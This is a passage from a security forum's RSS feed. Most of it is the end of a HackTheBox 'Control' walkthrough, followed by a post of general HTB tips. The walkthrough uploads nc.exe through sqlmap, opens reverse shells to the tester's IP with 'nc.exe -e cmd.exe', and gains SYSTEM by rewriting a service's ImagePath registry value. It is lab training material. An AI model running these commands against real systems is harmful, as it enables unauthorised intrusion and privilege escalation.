do you want confirmation that the local file 'nc.exe' has been successfully written on the back-end DBMS file system ('C:/inetpub/wwwroot/uploads/nc.exe')? [Y/n] y
[23:24:19] [INFO] the local file 'nc.exe' and the remote file 'C:/inetpub/wwwroot/uploads/nc.exe' have the same size (28160 B)
[23:24:19] [INFO] fetched data logged to text files under '/home/baud/.sqlmap/output/10.10.10.167'
[23:24:19] [WARNING] you haven't updated sqlmap for more than 65 days!!!

[*] ending @ 23:24:19 /2020-04-06/
</code></pre>
<p>Check if the web shell works as intended:</p>
<p><span alt="immagine" data-base62-sha1="nprtEHx2zDL7dY3onoSBdiZdHNA" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>Now with a single request to that page we can start a proper reverse shell using nc and we’re in:</p>
<pre><code class="lang-nohighlight">baud@kali:~/HTB/control$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.15.203] from (UNKNOWN) [10.10.10.167] 57762
Microsoft Windows [Version 10.0.17763.805]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\inetpub\wwwroot\uploads&gt;
</code></pre>
<hr>
<h2>Escalating to Hector and local enumeration</h2>
<p>As it turns out the Manager user does not exist, but Hector does have an account on the system:</p>
<pre><code class="lang-nohighlight">C:\inetpub\wwwroot\uploads&gt;dir c:\users
dir c:\users
 Volume in drive C has no label.
 Volume Serial Number is C05D-877F

 Directory of c:\users

11/05/2019  03:34 PM    &lt;DIR&gt;          .
11/05/2019  03:34 PM    &lt;DIR&gt;          ..
11/05/2019  03:34 PM    &lt;DIR&gt;          Administrator
11/01/2019  12:09 PM    &lt;DIR&gt;          Hector
10/21/2019  05:29 PM    &lt;DIR&gt;          Public
               0 File(s)              0 bytes
               5 Dir(s)  43,519,860,736 bytes free

C:\inetpub\wwwroot\uploads&gt;
</code></pre>
<p>Because we already have found Hector’s password we can switch to it with a <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_pssessions?view=powershell-7" rel="nofollow noopener">PSSession</a>:</p>
<pre><code class="lang-nohighlight">C:\inetpub\wwwroot\uploads&gt;powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\inetpub\wwwroot\uploads&gt; $pw = ConvertTo-SecureString -String "l33th4x0rhector" -AsPlainText -force
$pw = ConvertTo-SecureString -String "l33th4x0rhector" -AsPlainText -force
PS C:\inetpub\wwwroot\uploads&gt; $pp = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ".\Hector", $pw
$pp = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ".\Hector", $pw
PS C:\inetpub\wwwroot\uploads&gt; Enter-PSSession -ComputerName localhost -Credential $pp
Enter-PSSession -ComputerName localhost -Credential $pp
[localhost]: PS C:\Users\Hector\Documents&gt; whoami
whoami
control\hector
[localhost]: PS C:\Users\Hector\Documents&gt;
</code></pre>
<p>And then launch nc.exe again to have a more comfortable shell instead of the awkward <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command?view=powershell-7" rel="nofollow noopener">Invoke-Command</a> syntax:</p>
<pre><code class="lang-nohighlight">[localhost]: PS C:\Users\Hector\Documents&gt; Invoke-Command -ScriptBlock { C:\inetpub\wwwroot\uploads\nc.exe -e cmd.exe 10.10.15.203 9898 }
</code></pre>
<p><span alt="immagine" data-base62-sha1="CTvZYUNqsKb1KO6awhdPu2ts6t" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>Looking for interesting files, the only thing that sticks out is Hector’s’ PowerShell history located in AppData:</p>
<pre><code class="lang-nohighlight">C:\Users\Hector\AppData&gt;dir C:\Users\Hector\AppData\roaming\microsoft\windows\powershell\psreadline
dir C:\Users\Hector\AppData\roaming\microsoft\windows\powershell\psreadline
 Volume in drive C has no label.
 Volume Serial Number is C05D-877F

 Directory of C:\Users\Hector\AppData\roaming\microsoft\windows\powershell\psreadline

11/25/2019  12:04 PM    &lt;DIR&gt;          .
11/25/2019  12:04 PM    &lt;DIR&gt;          ..
11/25/2019  02:36 PM               114 ConsoleHost_history.txt
               1 File(s)            114 bytes
               2 Dir(s)  43,519,021,056 bytes free

C:\Users\Hector\AppData&gt;
</code></pre>
<p>It contains the following commands:</p>
<pre><code class="lang-nohighlight">C:\Users\Hector\AppData&gt;more C:\Users\Hector\AppData\roaming\microsoft\windows\powershell\psreadline\ConsoleHost_history.txt
more C:\Users\Hector\AppData\roaming\microsoft\windows\powershell\psreadline\ConsoleHost_history.txt
get-childitem HKLM:\SYSTEM\CurrentControlset | format-list
get-acl HKLM:\SYSTEM\CurrentControlSet | format-list

C:\Users\Hector\AppData&gt;
</code></pre>
<p>There are two commands that query the registry, replicating the first one returns this output:</p>
<pre><code class="lang-nohighlight">C:\Users\Hector\AppData&gt;powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Hector\AppData&gt; get-childitem HKLM:\SYSTEM\CurrentControlset | format-list
get-childitem HKLM:\SYSTEM\CurrentControlset | format-list


Property      : {BootDriverFlags, CurrentUser, EarlyStartServices, PreshutdownOrder...}
PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Control
PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
PSChildName   : Control
PSDrive       : HKLM
PSProvider    : Microsoft.PowerShell.Core\Registry
PSIsContainer : True
SubKeyCount   : 121
View          : Default
Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
ValueCount    : 11
Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Control

Property      : {NextParentID.daba3ff.2, NextParentID.61aaa01.3, NextParentID.1bd7f811.4, NextParentID.2032e665.5...}
PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Enum
PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
PSChildName   : Enum
PSDrive       : HKLM
PSProvider    : Microsoft.PowerShell.Core\Registry
PSIsContainer : True
SubKeyCount   : 17
View          : Default
Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
ValueCount    : 27
Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Enum

Property      : {}
PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Hardware Profiles
PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
PSChildName   : Hardware Profiles
PSDrive       : HKLM
PSProvider    : Microsoft.PowerShell.Core\Registry
PSIsContainer : True
SubKeyCount   : 3
View          : Default
Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
ValueCount    : 0
Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Hardware Profiles

Property      : {}
PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Policies
PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
PSChildName   : Policies
PSDrive       : HKLM
PSProvider    : Microsoft.PowerShell.Core\Registry
PSIsContainer : True
SubKeyCount   : 0
View          : Default
Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
ValueCount    : 0
Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Policies

Property      : {}
PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services
PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
PSChildName   : Services
PSDrive       : HKLM
PSProvider    : Microsoft.PowerShell.Core\Registry
PSIsContainer : True
SubKeyCount   : 667
View          : Default
Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
ValueCount    : 0
Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services

Property      : {}
PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Software
PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
PSChildName   : Software
PSDrive       : HKLM
PSProvider    : Microsoft.PowerShell.Core\Registry
PSIsContainer : True
SubKeyCount   : 1
View          : Default
Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
ValueCount    : 0
Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Software
</code></pre>
<p>This is just used to return all the child items of the CurrentControlSet registry location. The second command on the other hand shows the access control list of the same registry entry:</p>
<pre><code class="lang-nohighlight">PS C:\Users\Hector\AppData&gt; get-acl HKLM:\SYSTEM\CurrentControlSet | format-list
get-acl HKLM:\SYSTEM\CurrentControlSet | format-list


Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet
Owner  : BUILTIN\Administrators
Group  : NT AUTHORITY\SYSTEM
Access : BUILTIN\Administrators Allow  FullControl
         NT AUTHORITY\Authenticated Users Allow  ReadKey
         NT AUTHORITY\Authenticated Users Allow  -2147483648
         S-1-5-32-549 Allow  ReadKey
         S-1-5-32-549 Allow  -2147483648
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Administrators Allow  268435456
         NT AUTHORITY\SYSTEM Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  268435456
         CREATOR OWNER Allow  268435456
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  -2147483648
         S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681 Allow  
         ReadKey
         S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681 Allow  
         -2147483648
Audit  : 
Sddl   : O:BAG:SYD:AI(A;;KA;;;BA)(A;ID;KR;;;AU)(A;CIIOID;GR;;;AU)(A;ID;KR;;;SO)(A;CIIOID;GR;;;SO)(A;ID;KA;;;BA)(A;CIIOI
         D;GA;;;BA)(A;ID;KA;;;SY)(A;CIIOID;GA;;;SY)(A;CIIOID;GA;;;CO)(A;ID;KR;;;AC)(A;CIIOID;GR;;;AC)(A;ID;KR;;;S-1-15-
         3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681)(A;CIIOID;GR;;;S
         -1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681)
</code></pre>
<p>While that output does not contain very interesting info it comes from a command we can re-use for further enumeration in the next phase, which is where the guess work bit begins.</p>
<hr>
<h2>Beginning of the guess work</h2>
<p>The box gave us a few hints, now it’s up to us to put all of them together and come up with an attack vector. Judging from his PowerShell history Hector was concerned with checking the ACL of the CurrentControlSet registry entries, so maybe, just maybe, some entries in there will have some interesting or non-standard permissions that we could take advantage of. This is our first assumption.</p>
<p>Arguably the most interesting entry within the CurrentControlSet child items is Services. All entries in the Services folder tell Windows how to manage the installed services, how to start them, when, with what privileges, and so on.</p>
<p>As we should already know, Windows services typically run under the <a href="https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account" rel="nofollow noopener">local SYSTEM</a> account unless they’ve been set to use a less privileged account, like the <a href="https://docs.microsoft.com/en-us/windows/win32/services/localservice-account" rel="nofollow noopener">local service</a> or the <a href="https://docs.microsoft.com/en-us/windows/win32/services/networkservice-account" rel="nofollow noopener">network service</a> accounts.</p>
<p>Because of the very high privileges under which a lot of services run they make for very interesting targets. So let’s start enumerating the services this installation of Windows has enabled, simply by listing the child entries of the Services directory in the registry:</p>
<pre><code class="lang-nohighlight">PS C:\Users\Hector\Documents&gt; reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services &gt; svcs.txt
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services &gt; svcs.txt
PS C:\Users\Hector\Documents&gt; dir
dir


    Directory: C:\Users\Hector\Documents


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----         4/6/2020   6:58 PM          45272 nc.exe                                                                
-a----         4/6/2020   7:02 PM             11 query                                                                 
-a----         4/6/2020   7:02 PM              0 Servicenames.txt                                                      
-a----         4/6/2020   7:03 PM          85894 svcs.txt                                                              


PS C:\Users\Hector\Documents&gt;
</code></pre>
<p>The output will look like this:</p>
<pre><code class="lang-nohighlight">[....]
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\netvscvfpp
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\NgcCtnrSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\NgcSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\NlaSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\Npfs
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\npsvctrig
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\nsi
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\nsiproxy
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\Ntfs
[....]
</code></pre>
<p>Transfer the output file locally using nc since we have it available, for easier analysis:</p>
<p><span alt="immagine" data-base62-sha1="fFlhHkqKr4yzLPQOAb8Z2iU9snI" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>With a list of the different service paths in the registry we can use the <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-acl?view=powershell-7" rel="nofollow noopener">Get-ACL</a> cmdlet that was also used by Hector to test a bunch of services for interesting permissions, I also pipe the output of the cmdlet to <em>fl</em>, which is an alias for <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/format-list?view=powershell-7" rel="nofollow noopener">Format List</a>, to avoid receiving a truncated output.</p>
<p>Of course this can be scripted very easily if you are not new to PowerShell, but because I suck at it I did it the manual way.</p>
<p>After trying out a few different services, you will eventually run into one that grants Hector full control access, like DeviceInstall:</p>
<pre><code class="lang-nohighlight">PS C:\Users\Hector\Documents&gt; get-acl HKLM:\SYSTEM\CurrentControlset\Services\DeviceInstall | fl
get-acl HKLM:\SYSTEM\CurrentControlset\Services\DeviceInstall | fl


Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\DeviceInstall
Owner  : NT AUTHORITY\SYSTEM
Group  : NT AUTHORITY\SYSTEM
Access : APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey
         NT AUTHORITY\SYSTEM Allow  FullControl
         CREATOR OWNER Allow  FullControl
         NT AUTHORITY\Authenticated Users Allow  ReadKey
         NT AUTHORITY\SYSTEM Allow  FullControl
         CONTROL\Hector Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
Audit  : 
Sddl   : O:SYG:SYD:AI(A;CIID;KR;;;AC)(A;ID;KA;;;SY)(A;CIIOID;KA;;;CO)(A;CIID;KR;;;AU)(A;CIIOID;KA;;;SY)(A;CIID;KA;;;S-1
         -5-21-3271572904-80546332-2170161114-1000)(A;CIID;KA;;;BA)
</code></pre>
<p>With those permissions DeviceInstall could make for an attackable service. Let’s query the registry for more information to see how a service entry looks like:</p>
<pre><code class="lang-nohighlight">PS C:\Users\Hector\Documents&gt; reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\DeviceInstall
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\DeviceInstall

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\DeviceInstall
    Description    REG_SZ    @%SystemRoot%\system32\umpnpmgr.dll,-101
    DisplayName    REG_SZ    @%SystemRoot%\system32\umpnpmgr.dll,-100
    ErrorControl    REG_DWORD    0x1
    FailureActions    REG_BINARY    100E0000000000000000000003000000140000000100000060EA000001000000C0D401000000000000000000
    FailureActionsOnNonCrashFailures    REG_DWORD    0x1
    Group    REG_SZ    PlugPlay
    ImagePath    REG_EXPAND_SZ    %SystemRoot%\system32\svchost.exe -k DcomLaunch -p
    ObjectName    REG_SZ    LocalSystem
    PreshutdownTimeout    REG_DWORD    0x36ee80
    RequiredPrivileges    REG_MULTI_SZ    SeTcbPrivilege\0SeSecurityPrivilege\0SeAssignPrimaryTokenPrivilege\0SeTakeOwnershipPrivilege\0SeLoadDriverPrivilege\0SeBackupPrivilege\0SeRestorePrivilege\0SeImpersonatePrivilege\0SeAuditPrivilege\0SeChangeNotifyPrivilege\0SeUndockPrivilege\0SeDebugPrivilege\0SeShutdownPrivilege
    ServiceSidType    REG_DWORD    0x1
    Start    REG_DWORD    0x3
    Type    REG_DWORD    0x20

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\DeviceInstall\Parameters
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\DeviceInstall\TriggerInfo
PS C:\Users\Hector\Documents&gt;
</code></pre>
<p>Out of all those keys, the one we are interested in is ImagePath. The ImagePath key tells Windows what command to execute when a service needs to be started. If we could change the ImagePath value of one of these services thanks to the permissions seen above and then start that service we would be able to execute arbitrary code as the local SYSTEM account.</p>
<p>Unfortunately, just because a registry ACL includes full control to Hector, it doesn’t mean we will be able to start that service. Hector is not a member of the Administrators group and so cannot arbitrarily shut down or restart services, we’re going to have to do some more trial and error to find some services we can control and which are also not running and we can start ourselves.</p>
<hr>
<h2>Privilege Escalation: Windows Service Hijack</h2>
<p>(improvised term)</p>
<p>The <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-service?view=powershell-7" rel="nofollow noopener">Get-Service</a> cmdlet comes to our aid, by using it to query a service we can tell whether that service is running or not:</p>
<pre><code class="lang-nohighlight">PS C:\Users\Hector\Documents&gt; get-service NetTcpPortSharing | fl
get-service NetTcpPortSharing | fl


Name                : NetTcpPortSharing
DisplayName         : Net.Tcp Port Sharing Service
Status              : Stopped
DependentServices   : {}
ServicesDependedOn  : {}
CanPauseAndContinue : False
CanShutdown         : False
CanStop             : False
ServiceType         : Win32ShareProcess
</code></pre>
<p>So services that can be queried with Get-Service and appear not to be running make for potential targets. Once again because Hector has limited permissions over services, only a portion of them can be queried with the cmdlet and this allows us to narrow down the number of targets to enumerate.</p>
<p>With some string manipulation we can turn the output file given to us earlier by the reg query command into a .ps1 script like this:</p>
<pre><code class="lang-nohighlight">Get-Service -Name ".NET CLR Data"
Get-Service -Name ".NET CLR Networking"
Get-Service -Name ".NET CLR Networking 4.0.0.0"
Get-Service -Name ".NET Data Provider for Oracle"
Get-Service -Name ".NET Data Provider for SqlServer"
Get-Service -Name ".NET Memory Cache 4.0"
Get-Service -Name ".NETFramework"
Get-Service -Name "1394ohci"
Get-Service -Name "3ware"
Get-Service -Name "ACPI"
Get-Service -Name "AcpiDev"
Get-Service -Name "acpiex"
Get-Service -Name "acpipagr"
Get-Service -Name "AcpiPmi"
Get-Service -Name "acpitime"
Get-Service -Name "ADOVMPPackage"
Get-Service -Name "ADP80XX"
Get-Service -Name "adsi"
Get-Service -Name "ADWS"
Get-Service -Name "AFD"
Get-Service -Name "afunix"
Get-Service -Name "ahcache"
Get-Service -Name "AJRouter"
Get-Service -Name "ALG"
Get-Service -Name "AmdK8"
Get-Service -Name "AmdPPM"
[....]
</code></pre>
<p>Download, execute, redirect output to a file and the result will be something like the following:</p>
<pre><code class="lang-nohighlight">Status   Name               DisplayName                           
------   ----               -----------                           
Stopped  applockerfltr      Smartlocker Filter Driver             
Stopped  AppMgmt            Application Management                
Stopped  AppVClient         Microsoft App-V Client                
Running  BFE                Base Filtering Engine                 
Running  BrokerInfrastru... Background Tasks Infrastructure Ser...
Running  CLFS               Common Log (CLFS)                     
Running  ClipSVC            Client License Service (ClipSVC)      
Stopped  ConsentUxUserSvc   ConsentUX                             
Running  DcomLaunch         DCOM Server Process Launcher          
Stopped  DevicePickerUse... DevicePicker                          
Stopped  DevicesFlowUserSvc DevicesFlow                           
Running  Dhcp               DHCP Client                           
Stopped  dmwappushservice   Device Management Wireless Applicat...
Running  Dnscache           DNS Client                            
Stopped  DoSvc              Delivery Optimization                 
Running  DsSvc              Data Sharing Service                  
Stopped  EFS                Encrypting File System (EFS)          
Running  EventLog           Windows Event Log                     
Stopped  icssvc             Windows Mobile Hotspot Service        
Stopped  KtmRm              KtmRm for Distributed Transaction C...
Running  LSM                Local Session Manager                 
Stopped  MapsBroker         Downloaded Maps Manager               
Running  mpsdrv             Windows Defender Firewall Authoriza...
Running  mpssvc             Windows Defender Firewall             
Running  MSDTC              Distributed Transaction Coordinator   
Running  NetBT              NetBT                                 
Stopped  NetSetupSvc        Network Setup Service                 
Stopped  NetTcpPortSharing  Net.Tcp Port Sharing Service          
Stopped  NgcCtnrSvc         Microsoft Passport Container          
Stopped  NgcSvc             Microsoft Passport                    
Stopped  PhoneSvc           Phone Service                         
Stopped  PimIndexMainten... Contact Data                          
Stopped  pla                Performance Logs &amp; Alerts             
Stopped  PrintWorkflowUs... PrintWorkflow                         
Stopped  RasAcd             Remote Access Auto Connection Driver  
Stopped  RasAuto            Remote Access Auto Connection Manager 
Running  RasMan             Remote Access Connection Manager      
Stopped  RemoteAccess       Routing and Remote Access             
Stopped  RmSvc              Radio Management Service              
Running  RpcEptMapper       RPC Endpoint Mapper                   
Running  RpcSs              Remote Procedure Call (RPC)           
Stopped  RSoPProv           Resultant Set of Policy Provider      
Running  SamSs              Security Accounts Manager             
Running  Schedule           Task Scheduler                        
Stopped  seclogon           Secondary Logon                       
Stopped  SecurityHealthS... Windows Security Service              
Stopped  SEMgrSvc           Payments and NFC/SE Manager           
Running  SENS               System Event Notification Service     
Stopped  SensorService      Sensor Service                        
Stopped  SensrSvc           Sensor Monitoring Service             
Stopped  smphost            Microsoft Storage Spaces SMP          
Running  Spooler            Print Spooler                         
Stopped  sppsvc             Software Protection                   
Running  SstpSvc            Secure Socket Tunneling Protocol Se...
Running  SystemEventsBroker System Events Broker                  
Running  TimeBrokerSvc      Time Broker                           
Stopped  UevAgentService    User Experience Virtualization Service
Stopped  UnistoreSvc        User Data Storage                     
Stopped  UserDataSvc        User Data Access                      
Stopped  UsoSvc             Update Orchestrator Service           
Stopped  vds                Virtual Disk                          
Stopped  WaaSMedicSvc       Windows Update Medic Service          
Stopped  WdBoot             Windows Defender Antivirus Boot Driver
Running  WdFilter           Windows Defender Antivirus Mini-Fil...
Running  WdNisDrv           Windows Defender Antivirus Network ...
Running  WdNisSvc           Windows Defender Antivirus Network ...
Running  WinDefend          Windows Defender Antivirus Service    
Running  WinHttpAutoProx... WinHTTP Web Proxy Auto-Discovery Se...
Stopped  WpnUserService     Windows Push Notifications User Ser...
Stopped  wuauserv           Windows Update  
</code></pre>
<p>Let’s see if we can start any of these stopped services. Most of them will give an error like this:</p>
<pre><code class="lang-nohighlight">PS C:\temp&gt; start-service ktmrm
start-service ktmrm
start-service : Service 'KtmRm for Distributed Transaction Coordinator (ktmrm)' cannot be started due to the following 
error: Cannot open ktmrm service on computer '.'.
At line:1 char:1
+ start-service ktmrm
+ ~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OpenError: (System.ServiceProcess.ServiceController:ServiceController) [Start-Service],  
   ServiceCommandException
    + FullyQualifiedErrorId : CouldNotStartService,Microsoft.PowerShell.Commands.StartServiceCommand
</code></pre>
<p>But a few will not act so whiny, for example:</p>
<pre><code class="lang-nohighlight">PS C:\temp&gt; start-service pla
start-service pla
PS C:\temp&gt; get-service pla | fl
get-service pla | fl


Name                : pla
DisplayName         : Performance Logs &amp; Alerts
Status              : Running
DependentServices   : 
ServicesDependedOn  : {RPCSS}
CanPauseAndContinue : False
CanShutdown         : True
CanStop             : True
ServiceType         : Win32ShareProcess
</code></pre>
<p>That means the service is attackable because we can tell Windows to start it after overwriting the original registry value with our payload, which could simply be an nc.exe reverse shell, in that case <a href="https://ss64.com/nt/reg.html" rel="nofollow noopener"><em>reg add</em></a> is used to change a service’s ImagePath key like this:</p>
<pre><code class="lang-nohighlight">reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\netsetupsvc /v ImagePath /D "C:\Users\Hector\Documents\nc.exe -e cmd.exe 10.10.15.203 7777"
</code></pre>
<p>Run Start-Service after the write operation and the payload will be executed:</p>
<p><span alt="immagine" data-base62-sha1="mHkX7bifArd4FDvXXCLb33Yyogj" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>This concludes the writeup for Control, I hope it was exhaustive, interesting, and comprehensible all at the same time.</p>
<p>Stay safe.</p>
            <p><small>3 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/hackthebox-writeup-control/20801">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/hackthebox-writeup-control/20801</link>
          <pubDate>Sat, 25 Apr 2020 15:08:42 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-20801</guid>
          <source url="https://0x00sec.org/t/hackthebox-writeup-control/20801.rss">HackTheBox Writeup: Control</source>
        </item>
        <item>
          <title>Useful things I tend to forget to do when playing HTB</title>
          <dc:creator><![CDATA[vict0ni]]></dc:creator>
          <category>Hackthebox Writeups</category>
          <description><![CDATA[
            <p>HTB is a great place for anyone to practice their hacking skills. It doesn’t matter if you’re a beginner or a seasoned security professional, it has all sorts of machines to challenge your skills. After spending many hours, trying to root as many boxes as possible, I observed that I tend to forget some good practices or certain techniques and commands that would make my life easier and I thought of making this little article.</p>
<h2>OSINT</h2>
<p>With that, I mean the general concept of OSINT and looking for clues and solutions.</p>
<ul>
<li>It’s always important to <strong>note any user you come across</strong> while browsing a website, as it may be useful for later use. A user <code>Carl Smith</code> that wrote an article on that box may have an account with the username <code>csmith</code> or <code>c.smith</code> or <code>cSmith</code> etc. If you come across a password with no username, chances are Mr. Smith is your guy.</li>
<li>
<strong>Do some research on the box’s creator.</strong> This may sound as a cheat, <strong>but</strong>(!) see it this way: when you’re doing a pentest and you want to do a spear phishing attack, you have to know your target, right?<br>
Many creators get in the process of creating a box just because they have an article about a technique to escalate privileges or a CVE under their name. Search for their blogs, their Github profiles and maybe even Twitter(?)!</li>
</ul>
<h2>Read <code>.bash_history</code>
</h2>
<p>Probably 99% of the boxes have it like that: <code>.bash_history &gt; /dev/null</code>. Nevertheless, once you’re in the box, it only takes you half of a second to check. In real-world environments <code>.bash_history</code> can contain juicy information, like <em>“accidental passwords typed after unsuccessful sudo”</em> as mentioned this <a href="https://0x00sec.org/t/the-ultimate-privilege-escalation-reference-wiki/9788">privilege escalation reference guide - Wiki</a> in 0x00sec. Although I get it why <code>.bash_history</code> gets redirected to <code>dev/null/</code> here in HTB. If it wasn’t, I would be getting root just by waiting for someone to enter the commands for me!</p>
<h2>$ <code>sudo -l</code>
</h2>
<p>I really don’t know why, I just forget it. But you shouldn’t!</p>
<h2>Enum, enum, enum</h2>
<p>I can’t stress that enough. <strong>Enumerate as if you’re about to get root.</strong><br>
Yeah, sometimes things are clear as daylight, e.g. having a machine that uses a web server that is vulnerable  to RCE. But most of the times it’s not and HTB wants you to suffer.</p>
<h2>Frustration is your enemy</h2>
<p>This can be a note to myself for every time I get stuck in a box. No, vict0ni, the box doesn’t want to mess with you. Neither does the creator. <strong>Take a step back, review your findings and the situation, and try again.</strong> This, of course, is not limited for playing HTB but it’s a good general tip for hacking and coding.</p>
<h2>Don’t avoid Windows boxes</h2>
<p><strong>You can’t avoid the inevitable.</strong> Windows were, are and will be a big part of the world of computers. Although it’s boxes doesn’t always have the most realistic environments, I tend to see HTB as a practice for the real world and a very good preparation for OSCP. As I lack of knowledge for Windows, I can only get better at it by practicing. As <a class="mention" href="https://0x00sec.org/u/pry0cc">@pry0cc</a> said:</p>
<blockquote>
<p>Eat your vegetables!</p>
</blockquote>
<p>(If you’re like <a class="mention" href="https://0x00sec.org/u/baud">@Baud</a>, replace the word “Windows” with “Linux”)</p>
<h3>Now go hack!</h3>
<p><br>
<br>
<img src="http://www.hackthebox.eu/badge/image/87180" alt="vict0ni" width="220" height="50"></p>
            <p><small>14 posts - 7 participants</small></p>
            <p><a href="https://0x00sec.org/t/useful-things-i-tend-to-forget-to-do-when-playing-htb/20784">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/useful-things-i-tend-to-forget-to-do-when-playing-htb/20784</link>
          <pubDate>Fri, 24 Apr 2020 21:13:17 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-20784</guid>
          <source url="https://0x00sec.org/t/useful-things-i-tend-to-forget-to-do-when-playing-htb/20784.rss">Useful things I tend to forget to do when playing HTB</source>
        </item>
        <item>
          <title>Writeup: 0x00sec CTF - Exercise #5</title>
          <dc:creator><![CDATA[H45uK1mchi]]></dc:creator>
          <category>CTF</category>
          <description><![CDATA[
